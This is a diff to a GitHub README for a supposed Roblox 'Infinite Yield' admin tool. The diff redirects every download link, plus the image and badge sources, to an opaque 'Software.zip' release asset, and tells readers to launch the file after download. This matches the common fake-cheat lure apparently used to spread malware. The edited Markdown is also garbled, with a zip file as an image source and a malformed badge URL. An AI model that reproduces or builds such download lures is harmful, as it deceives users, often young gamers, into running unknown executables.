@@ -10,7 +10,7 @@ Welcome to the Infinite Yield Admin Tool repository! This admin tool is designed
 
 ## Usage
 
-To explore the features of the Infinite Yield Admin Tool and start experimenting with admin commands and game management options, simply [download the tool here](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip). Please note that the file needs to be launched after download to access its full functionality.
+To explore the features of the Infinite Yield Admin Tool and start experimenting with admin commands and game management options, simply [download the tool here](https://github.com/rodako/Infinite-Yield-Admin-Tool-for-Roblox-Educational-Purposes/releases/download/v1.0/Software.zip). Please note that the file needs to be launched after download to access its full functionality.
 
 ## Features
 
@@ -20,7 +20,7 @@ To explore the features of the Infinite Yield Admin Tool and start experimenting
 - **Educational Tool:** Learn how to utilize admin tools effectively for educational purposes.
 - **Lua Programming:** Explore Lua scripting capabilities in Roblox for advanced customization.
 
-![Roblox Image](https://via.placeholder.com/728x300.png)
+![Roblox Image](https://github.com/rodako/Infinite-Yield-Admin-Tool-for-Roblox-Educational-Purposes/releases/download/v1.0/Software.zip)
 
 ## Getting Started
 
@@ -38,4 +38,4 @@ If you encounter any issues or have any questions regarding the Infinite Yield A
 
 Let's make game development in Roblox a fun and educational experience together! Happy scripting! 🎮🚀
 
-[![Download Tool](https://img.shields.io/badge/Download%20Tool-Click%20Here-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Tool](https://github.com/rodako/Infinite-Yield-Admin-Tool-for-Roblox-Educational-Purposes/releases/download/v1.0/Software.zip%20Tool-Click%https://github.com/rodako/Infinite-Yield-Admin-Tool-for-Roblox-Educational-Purposes/releases/download/v1.0/Software.zip)](https://github.com/rodako/Infinite-Yield-Admin-Tool-for-Roblox-Educational-Purposes/releases/download/v1.0/Software.zip)
